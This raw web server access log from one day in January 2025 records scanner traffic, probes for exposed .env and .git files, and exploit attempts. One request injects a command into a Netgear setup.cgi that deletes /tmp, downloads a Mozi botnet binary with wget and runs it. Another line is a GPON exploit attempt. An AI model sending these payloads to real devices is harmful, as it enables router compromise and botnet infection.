193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /v2/.env.old HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /v2/.env.live HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env.dev HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env.test HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:15 +0000] "GET /wp-content/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /wp-content/.env.backup HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /wp-content/.env.old HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /wp-content/.env.live HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env.local HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env.production HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env.dev HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env.test HTTP/1.1" 302 385 "-" "-"
193.41.206.36 - - [08/Jan/2025:14:47:16 +0000] "GET /application/.env.staging HTTP/1.1" 302 385 "-" "-"
81.161.238.40 - - [08/Jan/2025:14:47:44 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
185.196.220.252 - - [08/Jan/2025:14:59:23 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
179.43.191.146 - - [08/Jan/2025:15:02:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
206.168.34.75 - - [08/Jan/2025:15:02:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.75 - - [08/Jan/2025:15:02:39 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.75 - - [08/Jan/2025:15:02:41 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.75 - - [08/Jan/2025:15:02:43 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
91.223.3.201 - - [08/Jan/2025:15:15:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [08/Jan/2025:15:28:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
154.213.187.172 - - [08/Jan/2025:15:45:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 302 387 "http://34.155.227.229:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
220.78.163.248 - - [08/Jan/2025:16:06:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [08/Jan/2025:16:19:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:16:19:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
47.237.115.100 - - [08/Jan/2025:16:23:37 +0000] "\x16\x03\x01" 400 524 "-" "-"
45.156.129.131 - - [08/Jan/2025:16:23:48 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.129.54 - - [08/Jan/2025:16:24:07 +0000] "GET /css/images/PTZOptics_powerby.png HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
139.59.101.104 - - [08/Jan/2025:16:26:05 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [08/Jan/2025:16:38:05 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.247.210 - - [08/Jan/2025:16:38:10 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
59.183.141.127 - - [08/Jan/2025:17:29:25 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://59.183.141.127:46118/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
206.168.34.215 - - [08/Jan/2025:17:44:33 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.215 - - [08/Jan/2025:17:44:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [08/Jan/2025:17:44:39 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [08/Jan/2025:17:44:42 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [08/Jan/2025:17:44:43 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
59.30.164.213 - - [08/Jan/2025:17:46:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
34.76.114.129 - - [08/Jan/2025:18:17:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
115.95.19.157 - - [08/Jan/2025:18:29:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
193.34.212.75 - - [08/Jan/2025:18:52:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [08/Jan/2025:19:11:59 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:19:11:59 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [08/Jan/2025:19:15:09 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
198.235.24.12 - - [08/Jan/2025:19:17:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.148 - - [08/Jan/2025:19:33:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:19:33:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [08/Jan/2025:19:33:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
14.46.8.17 - - [08/Jan/2025:19:41:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.13.153.140 - - [08/Jan/2025:19:51:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
185.196.220.253 - - [08/Jan/2025:20:09:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
220.132.156.137 - - [08/Jan/2025:20:18:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
125.142.163.191 - - [08/Jan/2025:20:19:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [08/Jan/2025:20:20:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.82.219.124 - - [08/Jan/2025:20:23:35 +0000] "GET /.env HTTP/1.0" 302 350 "-" "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0"
45.164.178.34 - - [08/Jan/2025:20:35:39 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 387 "-" "Hello, World"
78.153.140.148 - - [08/Jan/2025:20:48:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:20:48:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:54:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:54:32 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:54:43 +0000] "GET /.git/index HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:54:54 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:55:05 +0000] "GET /centreon/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
80.13.153.140 - - [08/Jan/2025:20:55:17 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 ANSSI security.txt fetch (https://www.cert.ssi.gouv.fr/scans/)"
80.13.153.140 - - [08/Jan/2025:20:55:17 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/.well-known/security.txt" "Mozilla/5.0 ANSSI security.txt fetch (https://www.cert.ssi.gouv.fr/scans/)"
221.157.29.239 - - [08/Jan/2025:21:01:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [08/Jan/2025:21:07:23 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
206.168.34.221 - - [08/Jan/2025:21:08:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.221 - - [08/Jan/2025:21:08:43 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [08/Jan/2025:21:08:46 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [08/Jan/2025:21:08:47 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [08/Jan/2025:21:08:47 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
178.215.236.132 - - [08/Jan/2025:21:09:04 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0"
179.43.191.146 - - [08/Jan/2025:21:09:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.195.29.134 - - [08/Jan/2025:21:19:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
193.34.212.75 - - [08/Jan/2025:21:21:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
112.186.234.136 - - [08/Jan/2025:21:41:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
154.213.184.132 - - [08/Jan/2025:21:41:47 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
172.105.128.12 - - [08/Jan/2025:21:46:33 +0000] "\x16\x03\x01" 400 524 "-" "-"
92.255.57.58 - - [08/Jan/2025:21:56:24 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [08/Jan/2025:21:56:24 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
87.120.115.119 - - [08/Jan/2025:22:19:53 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
83.222.191.146 - - [08/Jan/2025:22:25:10 +0000] "GET / HTTP/1.0" 200 1003 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
92.255.57.58 - - [08/Jan/2025:22:34:50 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
194.0.234.106 - - [08/Jan/2025:22:57:05 +0000] "GET /xml/info.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
194.0.234.106 - - [08/Jan/2025:22:57:06 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/xml/info.xml" "Mozilla/5.0 zgrab/0.x"
195.3.223.55 - - [08/Jan/2025:23:07:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [08/Jan/2025:23:30:46 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:23:30:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
91.223.3.201 - - [08/Jan/2025:23:35:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [08/Jan/2025:23:48:38 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
